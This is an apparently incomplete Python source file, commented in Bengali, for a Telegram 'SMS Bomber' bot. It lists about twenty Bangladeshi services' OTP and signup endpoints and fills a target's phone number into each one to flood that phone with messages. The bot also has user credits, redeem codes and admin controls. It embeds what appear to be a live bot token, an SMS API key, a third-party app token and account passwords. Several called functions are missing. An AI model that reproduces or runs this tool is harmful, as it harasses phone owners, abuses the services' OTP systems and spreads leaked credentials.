import os
import asyncio
import logging
import aiosqlite
import aiohttp
import json
import random
import csv
import re
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ===================== কনফিগারেশন (এনভায়রনমেন্ট ভেরিয়েবল ব্যবহার করুন) =====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8072096171:AAF0UBOlXnyQNBjczNeeFVDCaiExja1xiF0")
ADMIN_ID = int(os.getenv("ADMIN_ID", 1967494059))
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "RobiEntertainment")
OWNER_USERNAME = os.getenv("OWNER_USERNAME", "RobiEntertainment")
SMS_API_URL = os.getenv("SMS_API_URL", "https://api.paglahost.shop/Custom_SMS/api.php")
SMS_API_KEY = os.getenv("SMS_API_KEY", "Shuvo55356")

DB_PATH = os.path.join(os.path.dirname(__file__), "bot_database.db")
CONFIG_PATH = os.path.join(os.path.dirname(__file__), "config.json")
LOG_FILE = "bot.log"

# ===================== লগিং সেটআপ =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ===================== ডিফল্ট API লিস্ট =====================
DEFAULT_APIS = [
    {"name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "body": {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"}},
    {"name": "OsudPotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "body": {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"}},
    {"name": "Bohubrihi", "method": "POST", "url": "https://bb-api.bohubrihi.com/public/activity/otp", "body": {"phone": "{phone}", "intent": "login"}},
    {"name": "Fundesh", "method": "POST", "url": "https://fundesh.com.bd/api/auth/generateOTP", "body": {"msisdn": "{phone}"}},
    {"name": "Jatri", "method": "POST", "url": "https://user-api.jslglobal.co/v2/send-otp", "body": {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}},
    {"name": "RedX", "method": "POST", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "body": {"mobile": "+88{phone}"}},
    {"name": "RabbitHoleBD", "method": "POST", "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP", "body": {"mobile": "+88{phone}"}},
    {"name": "Qcoom", "method": "POST", "url": "https://auth.qcoom.com/api/v1/otp/send", "body": {"mobileNumber": "+88{phone}"}},
    {"name": "Training.gov.bd", "method": "POST", "url": "https://training.gov.bd/backoffice/api/user/sendOtp", "body": {"mobile": "{phone}"}},
    {"name": "Easy.com.bd", "method": "POST", "url": "https://core.easy.com.bd/api/v1/registration", "body": {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be"}},
    {"name": "Hoichoi", "method": "POST", "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "body": {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": True, "whatsappConsent": True}},
    {"name": "Addatimes", "method": "POST", "url": "https://app.addatimes.com/api/login", "body": {"phone": "{phone}", "country_code": "BD"}},
    {"name": "DeeptoPlay", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"}},
    {"name": "TimezoneBD", "method": "POST", "url": "https://backend.timezonebd.com/api/v1/user/otp-request", "body": {"phone": "{phone}"}},
    {"name": "Chorki", "method": "POST", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"number": "+880{phone}"}},
    {"name": "Ghoori Learning", "method": "POST", "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "body": {"mobile_no": "{phone}"}},
    {"name": "Swap.com.bd", "method": "POST", "url": "https://api.swap.com.bd/api/v1/send-otp/v2", "body": {"phone": "{phone}"}},
    {"name": "BdTickets", "method": "POST", "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send", "body": {"phone": "+880{phone}"}},
    {"name": "Binge.buzz", "method": "POST", "url": "https://ss.binge.buzz/otp/send/login", "body": {"mobile": "{phone}"}},
]

WORKING_APIS = []
API_LIMITS = {"daily_limit": 1000, "per_user_limit": 50, "api_call_interval": 0.8, "max_retries": 3}

# ===================== ডাটাবেস ইনিশিয়ালাইজ =====================
async def init_db():
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("""CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                balance INTEGER DEFAULT 10,
                total_sms INTEGER DEFAULT 0,
                total_bombing INTEGER DEFAULT 0,
                join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'active'
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS redeem_codes (
                code TEXT PRIMARY KEY,
                amount INTEGER,
                usages INTEGER,
                created_by INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS redeem_history (
                user_id INTEGER,
                code TEXT,
                redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (user_id, code)
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS api_usage (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                api_name TEXT,
                user_id INTEGER,
                success INTEGER,
                usage_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS api_stats (
                api_name TEXT PRIMARY KEY,
                total_calls INTEGER DEFAULT 0,
                total_success INTEGER DEFAULT 0,
                total_failed INTEGER DEFAULT 0,
                last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS user_api_stats (
                user_id INTEGER,
                api_name TEXT,
                total_calls INTEGER DEFAULT 0,
                last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (user_id, api_name)
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS admin_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_id INTEGER,
                action TEXT,
                target_id INTEGER,
                details TEXT,
                log_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('FREE50', 50, 100, ?)", (ADMIN_ID,))
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('WELCOME10', 10, 200, ?)", (ADMIN_ID,))
            await db.commit()
            logger.info("✅ ডাটাবেস তৈরি/আপডেট হয়েছে")
    except Exception as e:
        logger.error(f"ডাটাবেস error: {e}")

def load_api_list():
    global WORKING_APIS
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
                WORKING_APIS = json.load(f)
            logger.info(f"✅ config.json থেকে {len(WORKING_APIS)} টি API লোড হয়েছে")
        except:
            WORKING_APIS = DEFAULT_APIS.copy()
            logger.warning("⚠️ config.json লোড করতে ব্যর্থ, ডিফল্ট API ব্যবহার করা হচ্ছে")
    else:
        WORKING_APIS = DEFAULT_APIS.copy()
        with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
            json.dump(DEFAULT_APIS, f, indent=2, ensure_ascii=False)
        logger.info("📁 config.json তৈরি করা হয়েছে")

# ===================== হেল্পার ফাংশন =====================
def replace_phone(data, phone):
    if isinstance(data, dict):
        return {k: replace_phone(v, phone) for k, v in data.items()}
    elif isinstance(data, list):
        return [replace_phone(item, phone) for item in data]
    elif isinstance(data, str):
        return data.replace('{phone}', phone)
    return data

def is_valid_bd_phone(number):
    return bool(re.match(r'^01[3-9]\d{8}$', number))

def check_success(response_text, status):
    if status in [200, 201, 202, 204]:
        try:
            data = json.loads(response_text)
            if isinstance(data, dict):
                if data.get('status') in ['success', 'ok', 'true', '1']:
                    return True
                if data.get('success') in [True, 'true', 1]:
                    return True
                if data.get('message') and 'otp' in data.get('message', '').lower():
                    return True
                if 'otp' in data:
                    return True
        except:
            text_lower = response_text.lower()
            success_keywords = ['success', 'otp', 'sent', 'ok', 'true', 'verified', 'done']
            if any(word in text_lower for word in success_keywords):
                return True
    return False

async def track_api_usage(api_name, user_id, success):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                """INSERT INTO api_stats (api_name, total_calls, total_success, total_failed) 
                   VALUES (?, 1, ?, ?) 
                   ON CONFLICT(api_name) DO UPDATE SET 
                   total_calls = total_calls + 1, 
                   total_success = total_success + ?, 
                   total_failed = total_failed + ?, 
                   last_used = CURRENT_TIMESTAMP""",
                (api_name, 1 if success else 0, 0 if success else 1,
                 1 if success else 0, 0 if success else 1)
            )
            await db.execute(
                """INSERT INTO user_api_stats (user_id, api_name, total_calls) 
                   VALUES (?, ?, 1) 
                   ON CONFLICT(user_id, api_name) DO UPDATE SET 
                   total_calls = total_calls + 1, 
                   last_used = CURRENT_TIMESTAMP""",
                (user_id, api_name)
            )
            await db.execute(
                "INSERT INTO api_usage (api_name, user_id, success) VALUES (?, ?, ?)",
                (api_name, user_id, 1 if success else 0)
            )
            await db.commit()
    except Exception as e:
        logger.error(f"API ট্র্যাক error: {e}")

async def admin_log(admin_id, action, target_id=None, details=""):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT INTO admin_logs (admin_id, action, target_id, details) VALUES (?, ?, ?, ?)",
                (admin_id, action, target_id, details)
            )
            await db.commit()
    except Exception as e:
        logger.error(f"অ্যাডমিন লগ error: {e}")

# ===================== কীবোর্ড =====================
def get_main_keyboard():
    """ইউজার মেনু – এইটাই আপনার খোঁজা মেনু"""
    keyboard = [
        ["📨 Send SMS", "💣 SMS Bomber"],
        ["👤 My Profile", "🎁 Redeem Code"],
        ["📊 My Stats", "📞 Contact Admin"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_admin_keyboard():
    keyboard = [
        ["💰 Add Credit", "➖ Remove Credit"],
        ["🚫 Ban User", "✅ Unban User"],
        ["📣 Broadcast", "🎟️ Create Code"],
        ["📊 Live Stats", "📈 API Stats"],
        ["👥 Users List", "🏆 Top Users"],
        ["💰 Total Balance", "📋 API List"],
        ["🔄 Reset Limits", "📤 Export Data"],
        ["🗑️ Clear Logs", "📜 Admin Logs"],
        ["🔙 Back"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_back_keyboard():
    keyboard = [["🔙 Back"]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ===================== ব্যান চেক =====================
async def is_user_banned(user_id):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT status FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            return row and row[0] == 'banned'

# ===================== স্টার্ট =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)",
            (user_id, user.username or user.first_name)
        )
        await db.commit()
    if await is_user_banned(user_id):
        await update.message.reply_text("🚫 আপনার অ্যাকাউন্ট ব্যান করা হয়েছে। অ্যাডমিনের সাথে যোগাযোগ করুন।")
        return
    if user_id == ADMIN_ID:
        await update.message.reply_text(
            f"👑 **অ্যাডমিন প্যানেল**\n\nস্বাগতম {user.first_name}!\n🆔 ID: `{user_id}`\n\n📌 একটি অপশন নির্বাচন করুন:",
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard()
        )
    else:
        # এখানেই ইউজার মেনু দেখানো হচ্ছে
        await update.message.reply_text(
            f"🔥 **স্বাগতম {user.first_name}!**\n\n"
            f"🆔 ID: `{user_id}`\n"
            f"💰 ব্যালেন্স: ১০ ক্রেডিট\n"
            f"📡 এপিআই: {len(WORKING_APIS)}\n\n"
            f"📌 **নিচের বাটন ব্যবহার করুন:**",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()   # <--- ইউজার মেনু
        )

# ===================== অন্যান্য ফাংশন (Send SMS, Bomber, Profile, Redeem, Contact, Admin) =====================
# ... (বাকি সব ফাংশন আগের মতোই থাকবে, তবে সংক্ষেপে দেখানো হলো)

# ===================== মেসেজ হ্যান্ডলার =====================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message = update.message.text
    logger.info(f"📩 {user_id} থেকে মেসেজ: {message}")

    # অ্যাডমিন কমান্ড (শুধু অ্যাডমিনের জন্য)
    if user_id == ADMIN_ID:
        if message in ["💰 Add Credit", "➖ Remove Credit", "🚫 Ban User", "✅ Unban User",
                       "📣 Broadcast", "🎟️ Create Code", "💰 Total Balance", "🏆 Top Users",
                       "📤 Export Data", "🔄 Reset Limits", "🗑️ Clear Logs", "📜 Admin Logs",
                       "📊 Live Stats", "📈 API Stats", "👥 Users List", "📋 API List"]:
            # এখানে সংশ্লিষ্ট ফাংশন কল করবেন (আগের কোডের মতো)
            # সংক্ষেপে দেখানো হলো
            await update.message.reply_text("অ্যাডমিন ফাংশন কল হবে (পূর্ণ কোডে সব আছে)")
            return
        elif message == "🔙 Back":
            await update.message.reply_text("🏠 অ্যাডমিন মেনু", reply_markup=get_admin_keyboard())
            context.user_data.clear()
            return
        if context.user_data.get('admin_state'):
            # অ্যাডমিন স্টেট হ্যান্ডলার কল
            return

    # ব্যান চেক
    if await is_user_banned(user_id):
        await update.message.reply_text("🚫 আপনার অ্যাকাউন্ট ব্যান করা হয়েছে!")
        return

    # ইউজার ব্যাক
    if message == "🔙 Back":
        await update.message.reply_text("🏠 মেইন মেনু", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return

    # মেইন মেনু – ইউজার কমান্ড
    if message == "📨 Send SMS":
        await cmd_sms(update, context)
    elif message == "💣 SMS Bomber":
        await cmd_bomber(update, context)
    elif message == "👤 My Profile":
        await profile(update, context)
    elif message == "🎁 Redeem Code":
        await redeem(update, context)
    elif message == "📊 My Stats":
        await stats(update, context)
    elif message == "📞 Contact Admin":
        await contact(update, context)
    else:
        # স্টেট অনুযায়ী প্রসেস (SMS নম্বর, মেসেজ, বোম্বার ইত্যাদি)
        state = context.user_data.get('state')
        if state == 'sms_number':
            await sms_number(update, context)
        elif state == 'sms_message':
            await sms_message(update, context)
        elif state == 'bomber_number':
            await bomber_number(update, context)
        elif state == 'bomber_amount':
            await bomber_amount(update, context)
        elif state == 'redeem_code':
            await redeem_process(update, context)
        else:
            await update.message.reply_text("❌ অনুগ্রহ করে নিচের বাটন ব্যবহার করুন:", reply_markup=get_main_keyboard())

# ===================== মেইন =====================
async def main():
    print("="*60)
    print("🔥 SMS বোম্বার বট চালু হচ্ছে...")
    load_api_list()
    await init_db()
    print(f"✅ {len(WORKING_APIS)} টি API লোড হয়েছে")
    print(f"👑 অ্যাডমিন ID: {ADMIN_ID}")
    print("="*60)

    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    print("✅ বট চালু আছে!")
    print("="*60)

    while True:
        await asyncio.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⛔ বট বন্ধ করা হয়েছে!")
    except Exception as e:
        print(f"❌ মারাত্মক ত্রুটি: {e}")
